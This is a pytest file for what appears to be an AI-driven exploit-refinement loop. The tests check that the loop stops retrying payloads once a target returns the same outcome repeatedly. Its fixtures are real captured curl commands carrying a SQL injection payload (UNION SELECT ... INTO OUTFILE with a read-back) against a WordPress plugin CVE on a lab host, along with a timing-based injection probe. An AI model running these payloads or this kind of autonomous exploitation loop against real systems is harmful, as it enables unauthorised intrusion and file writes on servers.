"""The refine loop must stop grinding on an outcome the target already gave.

THE DEFECT
----------
The loop's duplicate detector compares `_refine_signature(_new_cmd)` — the
COMMAND the model proposes. Nothing compared the OUTCOME the target returned.
So the model perturbs the payload just enough that the command signature
differs, `_refine_dup_streak` resets to 0, and the server keeps answering
identically until max_iters.

Measured on the 2026-10-13 focused-10 run — 49 dispatched runs across the five
loopers produced 22 distinct outcomes:

    CVE-2023-51483  11 runs,  3 outcomes, one repeated 6x  (shell refusal)
    CVE-2024-4443   11 runs,  5 outcomes, one repeated 5x  (the normal HTML page)
    CVE-2024-5314   11 runs,  6 outcomes, one repeated 4x
    CVE-2024-36412   7 runs,  3 outcomes, one repeated 4x  ("Thank you for accepting")
    CVE-2024-22120   9 runs,  5 outcomes, one repeated 4x

A repeated outcome is provably zero-information: whatever the model changed
never reached the vulnerable code, so another payload tweak cannot help.

The four layers under test:
  1. outcome repetition is a CONTROL signal, not just advice for the prompt
  2. an axis-change gate refuses a payload-only edit BEFORE dispatch
  3. the repeated outcome's tier names WHICH axis is dead
  4. a signature prior builds hit N times and never resolved is known-dead

Fixtures are real captured commands from the CVE-2024-4443 trace (CLAUDE.md:
"Fixtures come from real captured tool output, not invented shapes").

    pytest tests/test_refine_loop_escalation.py
"""
from __future__ import annotations

import ast
import os
import pathlib
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _ast_assert import call_kwarg  # noqa: E402

API = pathlib.Path(__file__).resolve().parents[1] / "app" / "rag-api" / "api.py"

# --- real consecutive commands, CVE-2024-4443 runs 8 and 9 of 11 ------------
# These are byte-for-byte what the model sent, one iteration apart. Same host,
# path, method, injection parameter (listingfields[1]), payload, and read-back
# proof. The ONLY difference in the entire 423-character command is
# `--data-urlencode` -> `--data`. The target returned the identical response to
# both, and the loop still had three iterations left to spend.
#
# This is the clearest statement of the defect: an iteration bought nothing,
# and the command-signature detector could not tell, because the command really
# was different.
CMD_ITER3 = (
    "curl -s -X POST 'http://172.19.18.126:9090/business-directory/?dosrch=1&q=&wpbdp_view=search' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' --max-time 30 --data-urlencode 'listingfields[1]=1 UNION SELECT 0x504f437a39366137623834393837 INTO OUTFILE 0x2f7661722f7777772f68746d6c2f706f632e747874-- -' >/dev/null 2>&1 && sleep 2 && curl -s 'http://172.19.18.126:9090/poc.txt'"
)
CMD_ITER4 = (
    "curl -s -X POST 'http://172.19.18.126:9090/business-directory/?dosrch=1&q=&wpbdp_view=search' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' --max-time 30 --data 'listingfields[1]=1 UNION SELECT 0x504f437a39366137623834393837 INTO OUTFILE 0x2f7661722f7777772f68746d6c2f706f632e747874-- -' >/dev/null 2>&1 && sleep 2 && curl -s 'http://172.19.18.126:9090/poc.txt'"
)


def _load():
    tree = ast.parse(API.read_text(encoding="utf-8"))
    fns = {"_timing_payload_scale", "_command_axes", "_axes_differ",
           "_outcome_repeat_streak", "_dead_axis_for_tier"}
    body = [n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name in fns]
    missing = fns - {n.name for n in body}
    if missing:
        pytest.fail(f"function(s) gone from api.py: {sorted(missing)}")
    body += [n for n in tree.body if isinstance(n, ast.Assign)
             and any(getattr(t, "id", "").startswith("_DEAD_AXIS") for t in n.targets)]
    ns: dict = {}
    exec(compile(ast.fix_missing_locations(ast.Module(body=body, type_ignores=[])),
                 "<api-subset>", "exec"), ns)
    return ns


@pytest.fixture(scope="module")
def api():
    return _load()


# --- layer 1: outcome repetition -------------------------------------------

def test_repeat_streak_counts_consecutive_identical_outcomes(api):
    s = api["_outcome_repeat_streak"]
    assert s([{"signature": "a"}]) == 0, "one outcome cannot be a repeat"
    assert s([{"signature": "a"}, {"signature": "a"}]) == 1
    assert s([{"signature": "a"}, {"signature": "a"}, {"signature": "a"}]) == 2
    assert s([{"signature": "a"}, {"signature": "b"}]) == 0, "streak must reset on a new outcome"
    assert s([{"signature": "a"}, {"signature": "a"}, {"signature": "b"}]) == 0, (
        "only the TAIL run counts — an older repeat is not current evidence")


def test_blank_signature_is_not_a_repeat(api):
    """An outcome we could not parse is not evidence that the outcome is the
    same (CLAUDE.md: 'unreachable is not absent'). Counting blanks would stop
    builds for having unreadable output."""
    s = api["_outcome_repeat_streak"]
    assert s([{"signature": ""}, {"signature": ""}, {"signature": ""}]) == 0
    assert s([]) == 0 and s(None) == 0


# --- layer 2: the axis gate -------------------------------------------------

def test_real_looping_pair_has_identical_axes(api):
    """THE case the gate exists for. These two really were consecutive
    iterations of CVE-2024-4443, and the target returned the same page to
    both."""
    a = api["_command_axes"](CMD_ITER3)
    b = api["_command_axes"](CMD_ITER4)
    assert CMD_ITER3 != CMD_ITER4, "fixture pair must not be literally identical"
    assert not api["_axes_differ"](a, b), (
        f"payload-only edit read as an axis change: {a} vs {b}")
    assert a["path"] == "/business-directory/" and a["method"] == "POST"
    assert a["proof"] == "read_back", "two-request canary read-back proof"


def test_session_plumbing_is_not_an_axis(api):
    """A nonce/CSRF/session parameter comes and goes with how the command
    happens to scrape it. Counting it makes a cosmetic edit look like a changed
    axis and the gate never fires — observed on the real pair above, where one
    grep variant left `_wpnonce=` in the body and the other did not."""
    axes = api["_command_axes"]
    assert "_wpnonce" not in axes(CMD_ITER3)["params"]
    base = "curl -X POST 'http://h/p' --data '%s=1&real=2'"
    for plumbing in ("_wpnonce", "nonce", "csrf_token", "authenticity_token",
                     "sid", "PHPSESSID", "JSESSIONID", "xsrf-token", "session_id"):
        got = axes(base % plumbing)["params"]
        assert plumbing not in got, f"{plumbing} counted as an injection axis"
        assert "real" in got, f"filtering {plumbing} also dropped a real param"


def test_percent_encoded_param_names_match_their_literal_form(api):
    """The model freely swaps `listingfields[1][1]=` for
    `listingfields%5B1%5D%5B1%5D=` between iterations — both forms appear in the
    real CVE-2024-4443 trace. Without URL-decoding, the encoded form matches no
    parameter at all, the two commands read as different axes, and the gate
    never fires on exactly the churn it exists to catch."""
    axes = api["_command_axes"]
    literal = ("curl -X POST 'http://h:9090/business-directory/' "
               "--data-urlencode 'listingfields[1][1]=PAYLOAD'")
    encoded = ("curl -X POST 'http://h:9090/business-directory/' "
               "--data-urlencode 'listingfields%5B1%5D%5B1%5D=PAYLOAD'")
    a, b = axes(literal), axes(encoded)
    want = {"listingfields[1][1]"}
    assert set(a["params"]) >= want, f"literal form not extracted: {a['params']}"
    assert set(b["params"]) >= want, f"percent-encoded form not decoded: {b['params']}"
    assert not api["_axes_differ"](a, b), (
        "the same parameter written two ways read as two different axes")


@pytest.mark.parametrize("name,mutate", [
    ("path",   lambda c: c.replace("/business-directory/", "/other-dir/")),
    ("param",  lambda c: c.replace("listingfields", "otherfield")),
    ("method", lambda c: c.replace("-X POST", "-X PUT")),
    ("host",   lambda c: c.replace("172.19.18.126:9090", "172.19.18.126:8080")),
])
def test_a_genuine_axis_change_is_recognised(api, name, mutate):
    """The gate must not block real progress — only payload-only churn."""
    a = api["_command_axes"](CMD_ITER3)
    b = api["_command_axes"](mutate(CMD_ITER3))
    assert api["_axes_differ"](a, b), f"changing the {name} was not seen as an axis change"


def test_proof_mechanism_is_an_axis(api):
    """Switching from a blind-timing proof to a read-back proof IS a real change
    of approach, even against the same endpoint."""
    timing = "curl 'http://h/p?id=1 AND SLEEP(5)'"
    readbk = "curl 'http://h/p?id=1' -o /tmp/a; curl 'http://h/out.txt'"
    a, b = api["_command_axes"](timing), api["_command_axes"](readbk)
    assert a["proof"] == "timing" and b["proof"] == "read_back"
    assert api["_axes_differ"](a, b)


# --- layer 3: the repeated outcome names the dead axis ----------------------

@pytest.mark.parametrize("tier,axis", [
    ("syntax", "command_shape"),
    ("refusal", "command_shape"),
    ("probe", "endpoint"),
    ("404", "endpoint"),
    ("401", "auth"),
    ("403", "auth"),
    ("waf", "carrier"),
    ("500", "parameter"),
])
def test_tier_maps_to_the_dead_axis(api, tier, axis):
    got_axis, directive = api["_dead_axis_for_tier"](tier)
    assert got_axis == axis
    assert directive and len(directive) > 40, "the directive must say what to change"


def test_unknown_tier_falls_back_to_parameter(api):
    """The app answering NORMALLY is the commonest loop (CVE-2024-36412's
    'Thank you for accepting' x4, CVE-2024-4443's HTML page x5). There is no
    error tier for 'it worked fine', so the default must handle it."""
    for tier in ("other", "", None, "latency_too_fast", "canary_missing"):
        axis, directive = api["_dead_axis_for_tier"](tier)
        assert axis == "parameter"
        assert "payload" in directive.lower()


def test_every_tier_error_signature_emits_is_mapped_or_defaulted(api):
    """_dead_axis_for_tier's keys must stay in step with the tiers
    _error_signature actually produces, or a real loop gets generic advice."""
    src = API.read_text(encoding="utf-8")
    fn = None
    for node in ast.parse(src).body:
        if isinstance(node, ast.FunctionDef) and node.name == "_error_signature":
            fn = ast.get_source_segment(src, node) or ""
    assert fn, "_error_signature is gone"
    emitted = set()
    for node in ast.walk(ast.parse(fn)):
        if (isinstance(node, ast.Assign) and len(node.targets) == 1
                and getattr(node.targets[0], "id", "") == "tier"
                and isinstance(node.value, ast.Constant)
                and isinstance(node.value.value, str)):
            emitted.add(node.value.value)
    assert emitted, "could not read the tiers out of _error_signature"
    for tier in emitted:
        axis, directive = api["_dead_axis_for_tier"](tier)
        assert axis and directive, f"tier {tier!r} has no directive"


# --- the wiring: all four layers must actually be reachable ----------------

def _loop_src():
    src = API.read_text(encoding="utf-8")
    for node in ast.parse(src).body:
        if isinstance(node, ast.FunctionDef) and node.name == "_run_refine_poc":
            return ast.get_source_segment(src, node) or ""
    pytest.fail("_run_refine_poc is gone")


def _calls_in_loop():
    called = set()
    for node in ast.walk(ast.parse(_loop_src())):
        if isinstance(node, ast.Call):
            f = node.func
            if isinstance(f, ast.Name):
                called.add(f.id)
    return called


@pytest.mark.parametrize("fn", [
    "_outcome_repeat_streak",     # layer 1
    "_command_axes",              # layer 2
    "_axes_differ",               # layer 2
    "_dead_axis_for_tier",        # layer 3
    "_signature_known_dead",      # layer 4
])
def test_layer_is_wired_into_the_refine_loop(fn):
    """A detector nothing calls is the failure mode this repo keeps hitting:
    built, embedded, read by nobody."""
    assert fn in _calls_in_loop(), (
        f"{fn} is never called from _run_refine_poc, so that layer cannot fire")


def test_axis_gate_never_falls_through_to_a_redispatch():
    """The top of the refine loop re-dispatches `command`. A `continue` inside
    the axis gate would therefore spend a REAL target run re-confirming the
    answer we already have — the gate would cost traffic instead of saving it.
    This was written as `continue` first and caught before it shipped."""
    gate = None
    for node in ast.walk(ast.parse(_loop_src())):
        # the gate is `if _axis_required and _new_cmd:`
        if (isinstance(node, ast.If) and isinstance(node.test, ast.BoolOp)
                and any(getattr(v, "id", "") == "_axis_required"
                        for v in node.test.values)):
            gate = node
    assert gate is not None, "the axis gate is gone from the refine loop"
    assert not any(isinstance(n, ast.Continue) for n in ast.walk(gate)), (
        "the axis gate uses `continue`, which returns to the loop top and "
        "re-dispatches the previous command — spending a real target run to "
        "re-confirm the outcome that triggered the gate")
    assert any(isinstance(n, ast.Break) for n in ast.walk(gate)), (
        "the gate must be able to leave the refine loop when the axis is "
        "exhausted, or an unchangeable axis spins until the pass cap")


def test_known_dead_lookup_excludes_the_current_run():
    """Counting this build's own rows would make a signature look 'known dead'
    from its own first repeat, in every build, for every error."""
    src = API.read_text(encoding="utf-8")
    fn = None
    for node in ast.parse(src).body:
        if isinstance(node, ast.FunctionDef) and node.name == "_signature_known_dead":
            fn = node
    assert fn, "_signature_known_dead is gone"
    args = [a.arg for a in fn.args.args] + [a.arg for a in fn.args.kwonlyargs]
    assert "exclude_run_id" in args
    # and the loop must actually pass it
    assert call_kwarg(_loop_src(), "_signature_known_dead", "exclude_run_id"), (
        "the refine loop does not exclude its own run from the known-dead count")


def _known_dead_node():
    src = API.read_text(encoding="utf-8")
    for node in ast.parse(src).body:
        if isinstance(node, ast.FunctionDef) and node.name == "_signature_known_dead":
            return node
    pytest.fail("_signature_known_dead is gone")


def test_known_dead_requires_zero_resolutions():
    """'Hit often' is not 'dead'. A signature many builds hit AND got past is
    the opposite — it is a solved problem, and the prior fix is the useful
    thing. Only never-resolved counts as dead."""
    fn = _known_dead_node()
    # the query must actually count resolutions
    sql = [n.value for n in ast.walk(fn)
           if isinstance(n, ast.Constant) and isinstance(n.value, str)]
    assert any("FILTER (WHERE resolved)" in s for s in sql), (
        "the query does not count how many prior runs resolved this signature")
    # out["dead"] must be gated on resolved == 0
    dead = None
    for n in ast.walk(fn):
        if (isinstance(n, ast.Assign) and len(n.targets) == 1
                and isinstance(n.targets[0], ast.Subscript)
                and getattr(n.targets[0].value, "id", "") == "out"
                and getattr(n.targets[0].slice, "value", "") == "dead"):
            dead = n.value
    assert dead is not None, 'nothing assigns out["dead"]'
    zero_cmp = [
        c for c in ast.walk(dead)
        if isinstance(c, ast.Compare)
        and any(isinstance(o, ast.Eq) for o in c.ops)
        and any(isinstance(x, ast.Constant) and x.value == 0 for x in c.comparators)
        and isinstance(c.left, ast.Subscript)
        and getattr(c.left.slice, "value", "") == "resolved"
    ]
    assert zero_cmp, (
        'out["dead"] is not gated on resolved == 0 — a signature that prior '
        "builds solved would be declared dead, discarding the one thing error "
        "memory is for")


def test_known_dead_fails_soft():
    """An unavailable error memory is not evidence that the approach works, so
    a DB failure must return dead=False rather than stopping the build."""
    src = API.read_text(encoding="utf-8")
    for node in ast.parse(src).body:
        if isinstance(node, ast.FunctionDef) and node.name == "_signature_known_dead":
            fn = ast.get_source_segment(src, node) or ""
    assert "except Exception" in fn and "return out" in fn
    handlers = [n for n in ast.walk(ast.parse(fn)) if isinstance(n, ast.ExceptHandler)]
    assert handlers, "no exception handler — a DB blip would kill the build"
